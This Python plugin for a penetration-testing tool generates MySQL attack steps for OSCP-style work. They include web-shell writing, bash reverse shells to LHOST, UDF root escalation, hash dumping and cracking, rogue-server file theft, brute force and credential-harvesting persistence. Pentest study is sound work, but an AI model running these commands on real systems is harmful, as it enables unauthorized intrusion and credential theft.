"""
MySQL service enumeration plugin

Generates tasks for MySQL enumeration including:
- Connection testing and banner grabbing
- Nmap NSE enumeration (empty passwords, users, hashes)
- Permission and privilege enumeration
- File operations (read/write with FILE privilege)
- UDF privilege escalation (if running as root)
- Credential extraction and hash cracking
- Advanced file techniques (binary data, NTFS ADS)
- Rogue MySQL server attacks (LOAD DATA LOCAL, JDBC deserialization)
- Metasploit automation (hashdump, UDF exploit)
- Configuration file reconnaissance (.my.cnf, my.ini, .mysql_history)

Extracted from HackTricks: pentesting-mysql.md
Generated by: CrackPot v1.0
Updated: 2025-10-07 (added 5 new task categories, 13 new techniques)
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class MySQLPlugin(ServicePlugin):
    """MySQL/MariaDB enumeration plugin"""

    @property
    def name(self) -> str:
        return "mysql"

    @property
    def default_ports(self) -> List[int]:
        return [3306]

    @property
    def service_names(self) -> List[str]:
        return ['mysql', 'mariadb', 'mysqld', 'mysql-server']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect MySQL services"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')
        return any(svc in service for svc in self.service_names) or port in self.default_ports

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate MySQL enumeration task tree"""
        version = service_info.get('version', '')

        tasks = {
            'id': f'mysql-enum-{port}',
            'name': f'MySQL Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # TASK 1: Quick Wins - Connection Test
        tasks['children'].append({
            'id': f'mysql-quickwins-{port}',
            'name': 'Quick Win Tests',
            'type': 'parent',
            'children': [
                {
                    'id': f'mysql-connect-root-{port}',
                    'name': 'Test root without password',
                    'type': 'command',
                    'metadata': {
                        'command': f'mysql -h {target} -u root',
                        'description': 'Test root login without password (common misconfiguration)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '-h': f'Target host ({target})',
                            '-u': 'Username (root)'
                        },
                        'success_indicators': [
                            'mysql> prompt appears',
                            'Welcome to MySQL/MariaDB monitor'
                        ],
                        'failure_indicators': [
                            'Access denied for user',
                            'ERROR 1045 (28000)'
                        ],
                        'next_steps': [
                            'If successful: SHOW GRANTS; to check privileges',
                            'SELECT user(); to confirm current user',
                            'SHOW DATABASES; to enumerate databases'
                        ],
                        'alternatives': [
                            f'nc -vn {target} {port} (banner grab)',
                            f'mysql -h {target} -u admin',
                            f'mysql -h {target} -u test'
                        ],
                        'notes': 'Always test default creds first - saves time. Other common users: admin, mysql, test.'
                    }
                },
                {
                    'id': f'mysql-banner-{port}',
                    'name': 'Banner grab for version',
                    'type': 'command',
                    'metadata': {
                        'command': f'nc -vn {target} {port}',
                        'description': 'Identify MySQL version via banner (no auth needed)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {'-v': 'Verbose', '-n': 'No DNS'},
                        'success_indicators': ['Version string visible (5.x/8.x/MariaDB)'],
                        'failure_indicators': ['Connection refused'],
                        'next_steps': ['Note version for CVE research', 'Check searchsploit'],
                        'alternatives': [f'nmap -sV -p {port} {target}'],
                        'notes': 'Version critical for exploit research. MySQL 5.x vs 8.x have different auth methods.'
                    }
                }
            ]
        })

        # TASK 2: Nmap NSE Enumeration
        tasks['children'].append({
            'id': f'mysql-nmap-{port}',
            'name': 'Nmap NSE Scripts',
            'type': 'command',
            'metadata': {
                'command': f'nmap -sV -p {port} --script mysql-empty-password,mysql-info,mysql-users,mysql-databases,mysql-dump-hashes,mysql-vuln-cve2012-2122 {target}',
                'description': 'Comprehensive MySQL enumeration via NSE scripts',
                'tags': ['OSCP:HIGH', 'AUTOMATED'],
                'flag_explanations': {
                    '-sV': 'Version detection',
                    '--script': 'Execute NSE scripts',
                    'mysql-empty-password': 'Test accounts with no password',
                    'mysql-info': 'Get server info',
                    'mysql-users': 'List users (requires auth)',
                    'mysql-databases': 'List databases (requires auth)',
                    'mysql-dump-hashes': 'Extract password hashes (requires auth)',
                    'mysql-vuln-cve2012-2122': 'Test auth bypass vulnerability'
                },
                'success_indicators': [
                    'Empty password accounts found',
                    'User list retrieved',
                    'Hashes dumped',
                    'CVE-2012-2122 vulnerable'
                ],
                'failure_indicators': ['All scripts require auth', 'Access denied'],
                'next_steps': [
                    'Use discovered credentials for enumeration',
                    'Crack dumped hashes',
                    'Exploit CVE-2012-2122 if vulnerable'
                ],
                'alternatives': ['Manual connection tests', 'Metasploit modules'],
                'notes': 'Some scripts need valid creds. CVE-2012-2122 = auth bypass via race condition. Save with -oA.'
            }
        })

        # TASK 3: Authenticated Enumeration
        tasks['children'].append({
            'id': f'mysql-auth-enum-{port}',
            'name': 'Authenticated Enumeration (Use Valid Creds)',
            'type': 'parent',
            'children': [
                {
                    'id': f'mysql-show-grants-{port}',
                    'name': 'Check current privileges',
                    'type': 'command',
                    'metadata': {
                        'command': f'mysql -h {target} -u root -e "SHOW GRANTS; SHOW GRANTS FOR CURRENT_USER();"',
                        'description': 'Enumerate privileges (FILE and SUPER are critical)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'REQUIRES_AUTH'],
                        'flag_explanations': {
                            '-e': 'Execute command and exit',
                            'SHOW GRANTS': 'Display granted privileges',
                            'CURRENT_USER()': 'Current authenticated user'
                        },
                        'success_indicators': [
                            'FILE privilege present (read/write files)',
                            'SUPER privilege present (create UDFs)',
                            'ALL PRIVILEGES'
                        ],
                        'failure_indicators': ['Access denied', 'Authentication failed'],
                        'next_steps': [
                            'FILE priv: Read /etc/passwd, write web shells',
                            'SUPER priv: UDF privilege escalation',
                            'Limited priv: Enumerate databases'
                        ],
                        'alternatives': [
                            'Interactive: mysql> SHOW GRANTS;',
                            'SELECT * FROM mysql.user WHERE user=\'root\';'
                        ],
                        'notes': 'FILE priv = can read/write files. SUPER priv = can create UDFs for code execution.'
                    }
                },
                {
                    'id': f'mysql-enum-users-{port}',
                    'name': 'Dump users and hashes',
                    'type': 'command',
                    'metadata': {
                        'command': f'mysql -h {target} -u root -e "SELECT user,authentication_string,file_priv,Super_priv FROM mysql.user;"',
                        'description': 'Extract user list with password hashes and privileges',
                        'tags': ['OSCP:HIGH', 'REQUIRES_AUTH'],
                        'flag_explanations': {
                            'authentication_string': 'Password hash (MySQL 5.7+)',
                            'file_priv': 'FILE privilege (Y/N)',
                            'Super_priv': 'SUPER privilege (Y/N)'
                        },
                        'success_indicators': ['Hashes visible', 'Users with FILE/SUPER identified'],
                        'failure_indicators': ['Access denied for mysql.user'],
                        'next_steps': [
                            'Save hashes for cracking',
                            'Crack: hashcat -m 300 (MySQL5) or -m 21100 (MySQL8)',
                            'Target privileged users'
                        ],
                        'alternatives': [
                            'Metasploit: auxiliary/scanner/mysql/mysql_hashdump',
                            'SELECT * FROM mysql.user; (full dump)'
                        ],
                        'notes': 'MySQL 5.x: -m 300 (hashcat). MySQL 8.0+: -m 21100 (hashcat). Hash column varies by version.'
                    }
                },
                {
                    'id': f'mysql-enum-databases-{port}',
                    'name': 'List databases',
                    'type': 'command',
                    'metadata': {
                        'command': f'mysql -h {target} -u root -e "SHOW DATABASES;"',
                        'description': 'Enumerate accessible databases',
                        'tags': ['OSCP:MEDIUM', 'REQUIRES_AUTH'],
                        'success_indicators': ['Database list displayed', 'Non-default DBs found'],
                        'failure_indicators': ['Access denied', 'Empty list'],
                        'next_steps': [
                            'USE <database>; SHOW TABLES;',
                            'DESCRIBE <table>;',
                            'SELECT * FROM <table>; (dump data)',
                            'Search for credentials, API keys'
                        ],
                        'alternatives': ['SELECT schema_name FROM information_schema.schemata;'],
                        'notes': 'Look for app databases (wordpress, joomla, webapp). Default DBs less interesting.'
                    }
                }
            ]
        })

        # TASK 4: File Operations (FILE privilege)
        tasks['children'].append({
            'id': f'mysql-file-ops-{port}',
            'name': 'File Operations (Requires FILE Privilege)',
            'type': 'parent',
            'children': [
                {
                    'id': f'mysql-check-secure-file-priv-{port}',
                    'name': 'Check file operation restrictions',
                    'type': 'command',
                    'metadata': {
                        'command': f'mysql -h {target} -u root -e "SHOW VARIABLES LIKE \'secure_file_priv\';"',
                        'description': 'Check if file operations are restricted',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'REQUIRES_AUTH'],
                        'flag_explanations': {
                            'secure_file_priv': 'File operation restrictions (MySQL 5.5.53+)'
                        },
                        'success_indicators': [
                            'Empty = unrestricted (read/write anywhere)',
                            'NULL = disabled completely',
                            'Path = restricted to directory'
                        ],
                        'failure_indicators': ['Access denied'],
                        'next_steps': [
                            'Empty: Attempt file read/write anywhere',
                            'Path: Target only that directory',
                            'NULL: Skip file ops, try UDF'
                        ],
                        'alternatives': ['SHOW VARIABLES LIKE "%file%";'],
                        'notes': 'Empty = full access (older/misconfigured). Modern MySQL defaults to restricted.'
                    }
                },
                {
                    'id': f'mysql-read-file-{port}',
                    'name': 'Read system files',
                    'type': 'command',
                    'metadata': {
                        'command': f'mysql -h {target} -u root -e "SELECT load_file(\'/etc/passwd\');"',
                        'description': 'Read arbitrary files (requires FILE privilege)',
                        'tags': ['OSCP:HIGH', 'REQUIRES_AUTH'],
                        'flag_explanations': {
                            'load_file()': 'MySQL function to read file contents'
                        },
                        'success_indicators': ['File contents displayed', '/etc/passwd visible'],
                        'failure_indicators': ['NULL (not found/no permission)', 'secure-file-priv blocks'],
                        'next_steps': [
                            'Read: /etc/passwd, /home/user/.ssh/id_rsa',
                            'Read: /var/www/html/config.php (credentials)',
                            'Read: /etc/mysql/debian.cnf (debian-sys-maint password)'
                        ],
                        'alternatives': ['LFI via web app', 'Direct access if RCE'],
                        'notes': 'Common targets: /etc/passwd, SSH keys, web configs, debian.cnf. Check secure_file_priv first.'
                    }
                },
                {
                    'id': f'mysql-write-shell-{port}',
                    'name': 'Write web shell (INTO OUTFILE)',
                    'type': 'command',
                    'metadata': {
                        'command': f'mysql -h {target} -u root -e "SELECT \'<?php system($_GET[\"cmd\"]); ?>\' INTO OUTFILE \'/var/www/html/shell.php\';"',
                        'description': 'Write PHP web shell (requires FILE priv + web root write access)',
                        'tags': ['OSCP:HIGH', 'REQUIRES_AUTH'],
                        'flag_explanations': {
                            'INTO OUTFILE': 'Write query result to file',
                            '<?php system($_GET["cmd"]); ?>': 'Minimal PHP web shell'
                        },
                        'success_indicators': ['Query OK', 'File created', 'Shell accessible via browser'],
                        'failure_indicators': ['secure-file-priv blocks', 'Permission denied', 'File exists'],
                        'next_steps': [
                            'Access: curl http://{target}/shell.php?cmd=id',
                            'Reverse shell: ?cmd=bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"'
                        ],
                        'alternatives': ['Python .pth RCE', 'UDF escalation'],
                        'notes': 'Web roots: /var/www/html (Debian), /usr/share/nginx/html (nginx), C:\\xampp\\htdocs (Windows). Cannot overwrite - use unique names.'
                    }
                }
            ]
        })

        # TASK 5: UDF Privilege Escalation
        tasks['children'].append({
            'id': f'mysql-privesc-{port}',
            'name': 'UDF Privilege Escalation (MySQL as Root)',
            'type': 'parent',
            'children': [
                {
                    'id': f'mysql-check-user-{port}',
                    'name': 'Check MySQL process owner',
                    'type': 'command',
                    'metadata': {
                        'command': 'ps aux | grep mysql | grep -v grep',
                        'description': 'Identify MySQL process user (critical for UDF escalation)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'REQUIRES_SHELL'],
                        'success_indicators': ['MySQL running as root'],
                        'failure_indicators': ['MySQL running as mysql user'],
                        'next_steps': [
                            'If root: UDF escalation viable (commands run as root)',
                            'If mysql: UDF still useful but limited privileges'
                        ],
                        'alternatives': ['systemctl status mysql', 'cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep user'],
                        'notes': 'UDF escalation: If MySQL runs as root, sys_exec() executes commands as root. Requires SUPER priv.'
                    }
                },
                {
                    'id': f'mysql-udf-escalation-{port}',
                    'name': 'UDF library upload and execution',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Upload malicious UDF library for code execution (requires SUPER + FILE)',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'REQUIRES_AUTH'],
                        'next_steps': [
                            'Step 1: Find library: locate lib_mysqludf_sys.so (Metasploit/sqlmap)',
                            'Step 2: CREATE TABLE npn(line blob);',
                            'Step 3: INSERT INTO npn values(load_file(\'/tmp/lib_mysqludf_sys.so\'));',
                            'Step 4: SHOW VARIABLES LIKE \'plugin%\'; (get plugin_dir)',
                            'Step 5: SELECT * FROM npn INTO DUMPFILE \'/plugin/dir/lib_mysqludf_sys.so\';',
                            'Step 6: CREATE FUNCTION sys_exec RETURNS integer SONAME \'lib_mysqludf_sys.so\';',
                            'Step 7: SELECT sys_exec(\'id > /tmp/out.txt\'); (test)',
                            'Step 8: SELECT sys_exec(\'bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"\'); (reverse shell)'
                        ],
                        'alternatives': [
                            'Windows: lib_mysqludf_sys.dll',
                            'Compile custom: gcc raptor_udf2.c',
                            'Metasploit: exploit/multi/mysql/mysql_udf_payload'
                        ],
                        'notes': 'Find library: locate "*lib_mysqludf_sys*". Linux: .so, Windows: .dll. Place in plugin_dir. sys_exec() returns exit code only - redirect output to file.'
                    }
                }
            ]
        })

        # TASK 6: Credential Extraction
        tasks['children'].append({
            'id': f'mysql-cred-extraction-{port}',
            'name': 'Credential Extraction (Shell Access)',
            'type': 'parent',
            'children': [
                {
                    'id': f'mysql-debian-cnf-{port}',
                    'name': 'Extract debian-sys-maint password',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat /etc/mysql/debian.cnf',
                        'description': 'Extract plaintext password for maintenance user (Debian/Ubuntu)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'LINUX', 'REQUIRES_SHELL'],
                        'success_indicators': ['Plaintext password visible', 'debian-sys-maint user found'],
                        'failure_indicators': ['Permission denied', 'File not found (not Debian/Ubuntu)'],
                        'next_steps': [
                            'Login: mysql -u debian-sys-maint -p',
                            'Enumerate privileges',
                            'Use for hashdump/enumeration'
                        ],
                        'alternatives': ['SELECT load_file(\'/etc/mysql/debian.cnf\');'],
                        'notes': 'Debian/Ubuntu specific. debian-sys-maint has elevated privileges. Quick win if shell access.'
                    }
                },
                {
                    'id': f'mysql-extract-hashes-file-{port}',
                    'name': 'Extract hashes from user.MYD',
                    'type': 'command',
                    'metadata': {
                        'command': 'grep -oaE "[-_\\.\\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"',
                        'description': 'Extract hashes from MySQL data file (no auth needed)',
                        'tags': ['OSCP:MEDIUM', 'LINUX', 'REQUIRES_SHELL'],
                        'success_indicators': ['Hashes extracted', 'Usernames visible'],
                        'failure_indicators': ['Permission denied', 'InnoDB (no .MYD file)'],
                        'next_steps': [
                            'Crack: hashcat -m 300 (MySQL5) or -m 21100 (MySQL8)',
                            'Crack: john --format=mysql-sha1 or --format=mysql-sha2'
                        ],
                        'alternatives': ['Authenticated: SELECT * FROM mysql.user;'],
                        'notes': 'MyISAM tables only (.MYD files). InnoDB stores differently. MySQL 5.x = SHA1, 8.0+ = SHA256.'
                    }
                },
                {
                    'id': f'mysql-crack-hashes-{port}',
                    'name': 'Crack password hashes',
                    'type': 'command',
                    'metadata': {
                        'command': 'hashcat -a 0 -m 300 hashes.txt /usr/share/wordlists/rockyou.txt',
                        'description': 'Offline hash cracking (mysql_native_password)',
                        'tags': ['OSCP:MEDIUM'],
                        'flag_explanations': {
                            '-a 0': 'Straight wordlist attack',
                            '-m 300': 'MySQL4.1/5.x (mysql_native_password)',
                            '-m 21100': 'MySQL 8.0+ (caching_sha2_password)'
                        },
                        'success_indicators': ['Cracked passwords displayed', 'Status: Cracked'],
                        'failure_indicators': ['Exhausted', 'Wrong hash format'],
                        'next_steps': [
                            'Use cracked creds for authentication',
                            'Test on SSH, other services (password reuse)',
                            'Document sources in OSCP report'
                        ],
                        'alternatives': [
                            'john --format=mysql-sha1 hashes.txt',
                            'Online: crackstation.net, hashes.com'
                        ],
                        'notes': 'MySQL 5.x = -m 300, MySQL 8.0+ = -m 21100. Hashes start with * (5.x) or $mysql-sha2$ (8.0+).'
                    }
                }
            ]
        })

        # TASK 7: Brute Force (last resort)
        tasks['children'].append({
            'id': f'mysql-bruteforce-{port}',
            'name': 'Credential Brute-Force (Last Resort)',
            'type': 'command',
            'metadata': {
                'command': f'hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt mysql://{target}',
                'description': 'Brute-force credentials (very noisy, slow, often fails)',
                'tags': ['OSCP:LOW', 'NOISY'],
                'flag_explanations': {'-L': 'Username list', '-P': 'Password list'},
                'success_indicators': ['Valid credentials found'],
                'failure_indicators': ['No creds found', 'Rate-limited', 'Lockout'],
                'next_steps': ['Use discovered creds for enumeration'],
                'alternatives': ['medusa -M mysql', 'nmap --script mysql-brute'],
                'notes': 'Brute-forcing MySQL is slow and usually not the intended OSCP path. Try default creds first.'
            }
        })

        # TASK 8: Advanced File Operations
        tasks['children'].append({
            'id': f'mysql-advanced-file-ops-{port}',
            'name': 'Advanced File Techniques (Binary/Windows)',
            'type': 'parent',
            'children': [
                {
                    'id': f'mysql-binary-write-{port}',
                    'name': 'Write binary data (unhex/base64)',
                    'type': 'command',
                    'metadata': {
                        'command': f'mysql -h {target} -u root -e "SELECT CONVERT(unhex(\'<HEX_DATA>\'), BINARY) INTO DUMPFILE \'/tmp/binary.bin\';"',
                        'description': 'Write arbitrary binary data (exploits, libraries) using hex encoding',
                        'tags': ['OSCP:MEDIUM', 'REQUIRES_AUTH', 'ADVANCED'],
                        'flag_explanations': {
                            'CONVERT(unhex())': 'Convert hex string to binary data',
                            'CONVERT(from_base64())': 'Alternative: base64 to binary',
                            'INTO DUMPFILE': 'Write raw binary (no formatting like OUTFILE)'
                        },
                        'success_indicators': ['Binary file created', 'Correct file size'],
                        'failure_indicators': ['secure-file-priv blocks', 'Permission denied'],
                        'next_steps': [
                            'Prepare payload: xxd -p exploit.bin | tr -d "\\n" (hex)',
                            'Or base64: base64 -w0 exploit.bin',
                            'Use for: UDF libraries, compiled exploits'
                        ],
                        'alternatives': [
                            'SELECT CONVERT(from_base64(\'<BASE64>\'), BINARY) INTO DUMPFILE',
                            'Upload via web interface if available'
                        ],
                        'notes': 'DUMPFILE for binaries (no escaping), OUTFILE for text. Useful for uploading UDF libs when file transfer is restricted.'
                    }
                },
                {
                    'id': f'mysql-windows-ntfs-ads-{port}',
                    'name': 'Create directories with NTFS ADS (Windows)',
                    'type': 'command',
                    'metadata': {
                        'command': f'mysql -h {target} -u root -e "SELECT 1 INTO OUTFILE \'C:\\\\MySQL\\\\lib\\\\plugin::$INDEX_ALLOCATION\';"',
                        'description': 'Create directories on Windows using NTFS alternate data streams (bypass restrictions)',
                        'tags': ['OSCP:LOW', 'REQUIRES_AUTH', 'WINDOWS', 'ADVANCED'],
                        'flag_explanations': {
                            '::$INDEX_ALLOCATION': 'NTFS ADS that forces directory creation',
                            'C:\\\\MySQL\\\\lib\\\\plugin': 'Common plugin directory path'
                        },
                        'success_indicators': ['Directory created', 'No error'],
                        'failure_indicators': ['Not NTFS filesystem', 'Path already exists'],
                        'next_steps': [
                            'After directory creation: upload UDF DLL',
                            'SELECT * FROM npn INTO DUMPFILE \'C:\\\\MySQL\\\\lib\\\\plugin\\\\lib.dll\';'
                        ],
                        'alternatives': [
                            'xp_cmdshell if SQL Server available',
                            'Web shell file upload'
                        ],
                        'notes': 'Windows-only trick. Useful when plugin directory missing and you cannot create it normally. NTFS-specific feature.'
                    }
                }
            ]
        })

        # TASK 9: Rogue MySQL Server Attacks
        tasks['children'].append({
            'id': f'mysql-rogue-server-{port}',
            'name': 'Client-Side Attacks (Rogue Server)',
            'type': 'parent',
            'children': [
                {
                    'id': f'mysql-rogue-server-setup-{port}',
                    'name': 'Setup rogue MySQL server for file read',
                    'type': 'manual',
                    'metadata': {
                        'description': 'If you can make target connect to YOUR MySQL server, steal files via LOAD DATA LOCAL',
                        'tags': ['OSCP:LOW', 'ADVANCED', 'REQUIRES_NETWORK'],
                        'next_steps': [
                            'Setup fake server: git clone https://github.com/allyshka/Rogue-MySql-Server',
                            'Or: git clone https://github.com/4ra1n/mysql-fake-server (Java)',
                            'Configure target file: /etc/passwd, /var/www/html/config.php, ~/.ssh/id_rsa',
                            'Make victim connect: mysql -h <YOUR_IP> -u root',
                            'Server responds with LOAD DATA LOCAL request',
                            'Victim client sends file contents to attacker'
                        ],
                        'alternatives': [
                            'Use MySQL SSRF to trigger outbound connection',
                            'DNS poisoning to redirect legitimate MySQL connections'
                        ],
                        'notes': 'Requires: victim client has "local_infile" enabled (disabled by default in MySQL 8.0+). Client-side attack, not server exploit. Read: http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/'
                    }
                },
                {
                    'id': f'mysql-jdbc-deserialization-{port}',
                    'name': 'JDBC client deserialization (CVE-2023-21971)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'If target uses MySQL Connector/J <= 8.0.32, exploit propertiesTransform parameter',
                        'tags': ['OSCP:LOW', 'CVE', 'JAVA', 'ADVANCED'],
                        'next_steps': [
                            'Identify: Java app using MySQL Connector/J',
                            'Craft JDBC URL: jdbc:mysql://<YOUR_IP>:3306/test?propertiesTransform=com.evil.Evil',
                            'Setup malicious class on attacker classpath or via fake server',
                            'When victim connects: RCE in JDBC client context',
                            'Fixed in: Connector/J 8.0.33+'
                        ],
                        'alternatives': [
                            'Other JDBC deserialization vectors (H2 database, etc.)'
                        ],
                        'notes': 'Pre-auth RCE in MySQL JDBC client. Attacker must control connection string or DNS. Reference: https://security.snyk.io/vuln/SNYK-JAVA-COMMYSQL-5441540'
                    }
                }
            ]
        })

        # TASK 10: Metasploit Automation
        tasks['children'].append({
            'id': f'mysql-metasploit-{port}',
            'name': 'Metasploit Modules (Automated)',
            'type': 'parent',
            'children': [
                {
                    'id': f'mysql-msf-hashdump-{port}',
                    'name': 'MSF: Hash dump',
                    'type': 'command',
                    'metadata': {
                        'command': f'msfconsole -q -x "use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS {target}; set RPORT {port}; set USERNAME root; set PASSWORD \'\'; run; exit"',
                        'description': 'Automated hash dumping via Metasploit (requires creds)',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'REQUIRES_AUTH'],
                        'flag_explanations': {
                            '-q': 'Quiet mode (no banner)',
                            '-x': 'Execute commands and exit'
                        },
                        'success_indicators': ['User hashes extracted', '[+] indicators'],
                        'failure_indicators': ['Authentication failed', 'Access denied'],
                        'next_steps': ['Crack with hashcat/john'],
                        'alternatives': ['Manual: SELECT * FROM mysql.user;'],
                        'notes': 'Also try: mysql_authbypass_hashdump (CVE-2012-2122), mysql_enum (full enumeration)'
                    }
                },
                {
                    'id': f'mysql-msf-udf-{port}',
                    'name': 'MSF: UDF code execution',
                    'type': 'command',
                    'metadata': {
                        'command': f'msfconsole -q -x "use exploit/multi/mysql/mysql_udf_payload; set RHOSTS {target}; set RPORT {port}; set USERNAME root; set PASSWORD \'\'; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST <LHOST>; run; exit"',
                        'description': 'Automated UDF privilege escalation via Metasploit',
                        'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'EXPLOIT', 'REQUIRES_AUTH'],
                        'success_indicators': ['Shell received', 'Session opened'],
                        'failure_indicators': ['MySQL not running as root', 'SUPER privilege missing'],
                        'next_steps': ['Interact with session', 'Post-exploitation'],
                        'alternatives': ['Manual UDF upload (see UDF task above)'],
                        'notes': 'Requires: root MySQL creds + MySQL running as root + SUPER privilege. Windows: use windows/shell/reverse_tcp payload.'
                    }
                }
            ]
        })

        # TASK 11: Configuration & Logging
        tasks['children'].append({
            'id': f'mysql-config-files-{port}',
            'name': 'Configuration File Reconnaissance (Shell Access)',
            'type': 'parent',
            'children': [
                {
                    'id': f'mysql-find-configs-{port}',
                    'name': 'Locate configuration files',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -name my.cnf -o -name my.ini -o -name .my.cnf 2>/dev/null',
                        'description': 'Find all MySQL configuration files (may contain passwords)',
                        'tags': ['OSCP:MEDIUM', 'LINUX', 'WINDOWS', 'REQUIRES_SHELL'],
                        'success_indicators': ['Config files found'],
                        'failure_indicators': ['Permission denied on all paths'],
                        'next_steps': [
                            'Read: cat /etc/mysql/my.cnf',
                            'Read: cat /etc/my.cnf',
                            'Read: cat ~/.my.cnf (user-specific)',
                            'Windows: C:\\Windows\\my.ini, C:\\MySQL\\my.ini',
                            'Search for: password, user, bind-address, log_bin'
                        ],
                        'alternatives': [
                            'SELECT load_file(\'/etc/mysql/my.cnf\'); (if FILE priv)',
                            'Check default locations manually'
                        ],
                        'notes': 'Config files: /etc/mysql/my.cnf, /etc/my.cnf, ~/.my.cnf (Linux), my.ini (Windows). Look for plaintext passwords, enabled logging.'
                    }
                },
                {
                    'id': f'mysql-enable-logging-{port}',
                    'name': 'Enable query logging for persistence',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Enable MySQL query logging to capture credentials from future queries',
                        'tags': ['OSCP:LOW', 'PERSISTENCE', 'REQUIRES_AUTH'],
                        'next_steps': [
                            'Edit: /etc/mysql/my.cnf',
                            'Uncomment: general_log_file = /var/log/mysql/mysql.log',
                            'Uncomment: general_log = 1',
                            'Restart: service mysql restart',
                            'Monitor: tail -f /var/log/mysql/mysql.log',
                            'Captured: Plaintext passwords from application queries'
                        ],
                        'alternatives': [
                            'SET GLOBAL general_log = \'ON\'; (runtime, requires SUPER)',
                            'SET GLOBAL log_output = \'FILE\';'
                        ],
                        'notes': 'Logging captures ALL queries including credentials. Useful for persistence and credential harvesting. Logs can grow large.'
                    }
                },
                {
                    'id': f'mysql-history-{port}',
                    'name': 'Check MySQL command history',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat ~/.mysql_history',
                        'description': 'Read MySQL shell command history (may contain credentials, queries)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'LINUX', 'REQUIRES_SHELL'],
                        'success_indicators': ['Commands with passwords visible', 'Interesting queries found'],
                        'failure_indicators': ['File not found', 'Empty history'],
                        'next_steps': [
                            'Search for: CREATE USER, GRANT, SET PASSWORD',
                            'Extract credentials from history',
                            'Check: /root/.mysql_history for root user history'
                        ],
                        'alternatives': [
                            'cat /root/.mysql_history',
                            'SELECT load_file(\'/root/.mysql_history\'); (if FILE priv)'
                        ],
                        'notes': 'MySQL shell saves command history like bash. Often contains plaintext passwords from CREATE USER or GRANT commands. Quick win.'
                    }
                }
            ]
        })

        # TASK 12: Exploit Research (with modern CVEs)
        if version:
            tasks['children'].append({
                'id': f'mysql-exploit-research-{port}',
                'name': f'Exploit Research: {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'searchsploit-mysql-{port}',
                        'name': f'SearchSploit: {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit mysql {version}',
                            'description': 'Search ExploitDB for known exploits',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'success_indicators': ['Exploits found', 'CVE numbers identified'],
                            'failure_indicators': ['No exploits found'],
                            'next_steps': [
                                'Review exploit requirements',
                                'Copy exploit: searchsploit -m <ID>',
                                'Test exploit'
                            ],
                            'alternatives': [
                                'Google: "MySQL {version} exploit"',
                                'Metasploit: search mysql {version}',
                                'GitHub: search for PoCs'
                            ],
                            'notes': 'Key CVEs: CVE-2012-2122 (auth bypass race), CVE-2016-6662 (config injection), CVE-2023-21971 (JDBC RCE), CVE-2021-27928 (Connector RCE)'
                        }
                    },
                    {
                        'id': f'mysql-version-specific-{port}',
                        'name': 'Version-specific attack vectors',
                        'type': 'manual',
                        'metadata': {
                            'description': f'Check {version}-specific vulnerabilities and misconfigurations',
                            'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                            'next_steps': [
                                'MySQL 5.x: Check for CVE-2012-2122 (auth bypass via race condition)',
                                'MySQL < 5.5.53: secure_file_priv unrestricted by default',
                                'MySQL 8.0+: caching_sha2_password (hashcat -m 21100)',
                                'MariaDB: Check for MDEV-* specific bugs',
                                'Check: SELECT @@version_comment; for variant (Percona, MariaDB)'
                            ],
                            'alternatives': [
                                'Nmap: --script mysql-vuln-*',
                                'Metasploit: search mysql version'
                            ],
                            'notes': 'MySQL 8.0 changed auth (sha2), made local_infile OFF by default. Older = easier. Version comment reveals fork (MariaDB, Percona).'
                        }
                    }
                ]
            })

        return tasks
